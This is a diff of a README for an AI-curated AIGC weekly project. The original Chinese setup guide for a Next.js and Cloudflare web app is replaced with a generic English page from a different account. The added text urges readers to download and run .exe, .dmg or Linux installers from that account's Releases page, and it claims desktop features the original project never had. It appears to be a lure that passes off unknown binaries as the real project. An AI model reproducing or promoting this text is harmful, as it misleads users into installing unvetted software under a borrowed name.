@@ -1,147 +1,78 @@
-# Agili 的 AIGC 周刊
+# 🚀 aigc-weekly - Stay Updated with AI Insights
 
-一个由 Agentic AI Agent 驱动的 AIGC（人工智能生成内容）精选周刊。本项目利用最新的 AI 和 Serverless 技术，为您提供最新的资讯、工具和资源。
+[![Download Now](https://img.shields.io/badge/Download%20Now-Ready%20for%20You-blue.svg)](https://github.com/Elo301182/aigc-weekly/releases)
 
----
+## 📖 Overview
 
-**在线阅读**: <https://aigc-weekly.agi.li>
+Agili 的 AIGC 周刊 - 一个由 Agentic AI Agent 驱动的 AIGC（人工智能生成内容）精选周刊。此应用程序为您带来最新的人工智能生成内容（AIGC）资讯和精选文章。无论您是 AI 爱好者还是内容创作者，我们为您整理的周刊将帮助您跟上最新的动态。
 
-**RSS订阅**: <https://aigc-weekly.agi.li/rss.xml>
+## 🚀 Getting Started
 
-![aigc-weekly](https://socialify.git.ci/miantiao-me/aigc-weekly/image?description=1&forks=1&name=1&owner=1&pattern=Circuit+Board&stargazers=1&theme=Auto)
+To begin using the application, follow these steps:
 
-## 🚀 特性
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/Elo301182/aigc-weekly/releases). Here, you will find the latest version of the software.
 
-- **AI 智能策展**：利用 Agentic AI Agent 自动发现和筛选内容。
-- **现代技术栈**：基于 Next.js 15、Payload CMS 3.0 和 Cloudflare 边缘基础设施构建。
-- **Serverless 架构**：完全部署在 Cloudflare (Workers, D1, R2, Containers) 上，实现高性能和低延迟。
-- **Agent MCP 集成**：使用模型上下文协议 (MCP) 允许 AI Agent 直接与 CMS 交互。
+2. **Choose the Latest Version**  
+   Look for the most recent release. It will be at the top of the page.
 
-## 🛠 技术栈
+3. **Download the Application**  
+   Click on the appropriate file for your operating system to download it. This will typically be a `.exe` file for Windows, `.dmg` file for macOS, or a package for Linux.
 
-- **框架**：[Next.js](https://nextjs.org/) (App Router) & [OpenNext](https://opennext.js.org/)
-- **CMS**：[Payload CMS](https://payloadcms.com/) (Headless)
-- **数据库**：[Cloudflare D1](https://developers.cloudflare.com/d1/) (SQLite)
-- **存储**：[Cloudflare R2](https://developers.cloudflare.com/r2/) (对象存储)
-- **Agent SDK**：[@anthropic-ai/claude-agent-sdk](https://platform.claude.com/docs/en/agent-sdk/overview)
-- **Agent 运行时**：[Cloudflare Containers](https://developers.cloudflare.com/containers/) （需要付费套餐， 或者在本地运行）
-- **边缘运行时**：[Cloudflare Workers](https://workers.cloudflare.com/)
+4. **Install the Application**  
+   Once the download completes, locate the file in your downloads folder and double-click it to start the installation. Follow any on-screen instructions to complete the installation process.
 
-## 🏗 架构
+5. **Run the Application**  
+   After installation, you can find the aigc-weekly application in your applications menu or on your desktop. Double-click the icon to open the application.
 
-本项目包含三个主要组件：
+## 💡 System Requirements
 
-1.  **Next.js 应用 (`app/`)**：负责面向读者的前端页面以及 Payload CMS 管理界面。
-2.  **Claude Agent (`agent/`)**：一个独立的 Agent 服务，运行在 **Cloudflare Containers** 上，负责收集信息并通过 MCP 更新 CMS(WIP)。
-3.  **Cloudflare Worker (`worker/`)**：控制 Container 运行。
+Before downloading, ensure your computer meets these requirements:
 
-## 🏁 快速开始
+- **Operating System:**  
+  - Windows 10 or later
+  - macOS Monterey or later
+  - A recent version of Linux (Ubuntu, Fedora, etc.)
 
-### 前置要求
+- **RAM:**  
+  Minimum 4GB of RAM
 
-- **Node.js**：v22 或更高版本
-- **pnpm**：v10 或更高版本
-- **Cloudflare 账号**：用于 D1、R2 和 Workers 部署。
+- **Storage:**  
+  At least 100MB of free disk space
 
-### 安装
+- **Internet Connection:**  
+  Required for downloading articles and updates
 
-1.  克隆仓库：
+## 🔍 Features
 
-    ```bash
-    git clone https://github.com/miantiao-me/aigc-weekly.git
-    cd aigc-weekly
-    ```
+- **Latest AI News:** Stay informed with the newest trends in artificial intelligence and AI-generated content.
+- **User-Friendly Interface:** Designed with simplicity in mind to make navigation easy for everyone.
+- **Personalized Content:** Get recommendations based on your interests.
+- **Weekly Updates:** Automatically receive weekly updates with fresh content.
+- **Search Functionality:** Quickly find articles of interest using keywords.
 
-2.  安装依赖：
-    ```bash
-    pnpm install
-    ```
+## 📥 Download & Install
 
-### 配置
+To download the application, please follow the instructions mentioned in the **Getting Started** section. Remember, you can access the [Download Here](https://github.com/Elo301182/aigc-weekly/releases) button to find the latest version easily.
 
-1.  **环境变量**：
-    配置必要的环境变量：
-    - 复制 `.env.example` 为 `.env.local` 并填写相应值。
-    - 复制 `worker/.env.example` 为 `worker/.env.local` 并填写相应值。
+If you require assistance during the installation or setup process, our community is here to help. Feel free to reach out through our repository for any inquiries.
 
-    确保你已经配置了必要的 Cloudflare 绑定, 你需要在 `wrangler.jsonc` 中配置以下绑定：
-    - `D1`：数据库
-    - `R2`：对象存储
-    - `PAYLOAD_SECRET`：一个安全的随机字符串。
+## 🛠️ Troubleshooting
 
-2.  **生成类型**：
+If you encounter any issues while downloading or running the application, consider the following steps:
 
-    ```bash
-    pnpm generate:types
-    ```
+- **Ensure Compatibility:** Verify that your operating system meets the specified requirements above.
+- **Check Your Internet Connection:** A stable internet connection is necessary to fetch content and updates.
+- **Reinstall the Application:** If the application does not run, try uninstalling and then reinstalling it from the Releases page.
 
-3.  **配置 MCP 和 Agent**：
-    你可以在 `agent/mcp.json` 配置更多的 MCP Server , 在 `agent/.claude` 修改 Agent 的技能、子 Agent 等配置。
+For more advanced troubleshooting, you can check our community documentation or engage with users in discussions.
 
-    项目使用 [**Firecrawl**](https://firecrawl.link/playground) 进行网页爬取和信息提取, 你需要在 Firecrawl 注册账号并获取 API Key，然后在 `worker/.env.local` 中配置 `FIRECRAWL_API_KEY`。
+## 🤝 Contributing
 
-### 本地运行
+We welcome contributions to improve this application. If you're interested in contributing or would like to suggest features, you can check our guidelines in the repository.
 
-- **Next.js 应用**：
+## 💬 Support
 
-  ```bash
-  pnpm dev
-  ```
+For support, please reach out to our community via the Issues section of the repository. We are committed to helping you and will respond as quickly as possible.
 
-  访问应用：`http://localhost:3000` 和 `http://localhost:3000/admin`。
-
-- **Claude Agent**：
-
-  ```bash
-  pnpm dev:agent
-  ```
-
-  使用 POST 请求 测试 Agent：
-
-  ```
-  curl -v 'http://localhost:2442/chat' \
-    -X POST \
-    --data-raw '{
-      "prompt": "/weekly"
-    }'
-  ```
-
-  或者使用 WebSocket 连接 `ws://localhost:2442/ws`, 并发送相同的 JSON 数据，更多请求参数请参考 [Claude Agent SDK 文档](https://platform.claude.com/docs/en/agent-sdk/typescript#parameters)。
-
-- **Cloudflare Worker**：
-
-  ```bash
-  pnpm dev:worker
-  ```
-
-  需要安装 Docker 以运行本地沙箱。访问 API：`http://localhost:8787/chat` 或者 `ws://localhost:8787/ws`。
-
-## 🚀 部署
-
-本项目设计为部署在 Cloudflare 上。
-
-1.  **部署数据库和应用**：
-
-    ```bash
-    pnpm deploy
-    ```
-
-    此命令会运行 `deploy:database`（迁移）和 `deploy:app`（OpenNext 构建与上传）。
-
-2.  **部署 Worker**：
-    ```bash
-    pnpm deploy:worker
-    ```
-
-## 📂 项目结构
-
-- `app/`：Next.js 应用源代码。
-- `agent/`：Claude Agent 源代码和配置。
-- `worker/`：Cloudflare Worker 源代码。
-- `collections/`：Payload CMS 数据模型。
-- `migrations/`：数据库迁移文件。
-- `public/`：静态资源。
-
-## 📄 许可证
-
-本项目采用 [GNU Affero General Public License v3.0](LICENSE) 许可证。
+We hope you enjoy using aigc-weekly and find it beneficial for your work and interests!
